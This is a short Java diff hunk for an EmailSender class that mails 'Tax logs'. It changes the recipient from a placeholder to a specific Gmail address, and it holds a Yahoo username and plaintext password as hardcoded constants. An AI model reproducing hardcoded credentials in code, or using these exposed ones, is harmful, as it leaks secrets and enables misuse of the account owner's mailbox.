@@ -17,7 +17,7 @@ public class EmailSender {
     private static final String SUBJECT = "Tax logs";
     private static final String USER = "java_developer_tester_2019@yahoo.com";
     private static final String PASSWORD = "uberhurqemrixxxt";
-    private static final String RECIPIENT = "<recipient>@gmail.com";
+    private static final String RECIPIENT = "hill10203040@gmail.com";
 
     public void sendLogEmail() {
 
